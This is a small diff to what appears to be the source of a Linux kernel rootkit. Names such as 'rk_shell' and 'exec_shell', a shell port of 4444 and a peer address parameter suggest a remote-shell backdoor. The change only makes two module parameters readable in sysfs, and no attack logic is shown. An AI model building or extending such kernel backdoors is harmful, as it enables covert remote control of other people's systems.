@@ -12,10 +12,10 @@ struct rk_shell interactive_shell;
 struct rk_shell exec_shell;
 
 unsigned short shell_port = 4444;
-module_param(shell_port, ushort, 0);
+module_param(shell_port, ushort, 0444);
 
 char peer_addr_str[16] = "127.0.0.1";
-module_param_string(peer_address, peer_addr_str, sizeof(peer_addr_str), 0);
+module_param_string(peer_address, peer_addr_str, sizeof(peer_addr_str), 0444);
 
 /* ------------------------------------------------------------------ */
 /* Module lifecycle                                                    */
